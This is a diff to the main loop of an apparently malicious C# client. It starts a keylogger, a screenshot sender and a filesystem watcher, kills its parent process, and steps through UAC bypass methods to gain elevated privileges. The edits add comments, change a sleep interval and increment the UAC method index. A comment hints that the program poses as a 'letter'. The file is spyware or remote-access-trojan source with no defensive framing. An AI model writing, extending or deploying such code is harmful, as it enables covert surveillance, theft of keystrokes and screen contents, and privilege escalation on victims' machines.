@@ -76,7 +76,7 @@ namespace Client
             /// Start loggers.
             Armitage.Watchers.Keylogger.Start();
 
-            Armitage.Watchers.Screen_Watcher.SendOne();
+            Armitage.Watchers.Screen_Watcher.SendOne(); // send a screenshot 
             Armitage.Watchers.Screen_Watcher.Start();
 
             Armitage.Watchers.Filesystem.Start();
@@ -86,9 +86,9 @@ namespace Client
 
             while (true)
             {
-                // Sleep, useless, but...makes me sleep at night
-                // remembering the letter wont randomly close.
-                Thread.Sleep(10 * 1000);
+                // Sleep, useless, but...makes me feel confident
+                // the letter wont randomly close...
+                Thread.Sleep(100 * 1000);
             }
         }
 
@@ -108,6 +108,7 @@ namespace Client
             {
                 if (args.Length > 0)
                 {
+                    // PID of parent to kill
                     int parent = int.Parse(args[0].Trim());
                     if (parent > 0)
                         Process.GetProcessById(parent).Kill();
@@ -118,7 +119,7 @@ namespace Client
                         /// Find suitable UAC method.
                         /// Since the last method didn't work,
                         /// increment the active method.
-                        UACMethod = int.Parse(args[1].Trim());
+                        UACMethod = int.Parse(args[1].Trim()) + 1;
                     }
                 }
             }
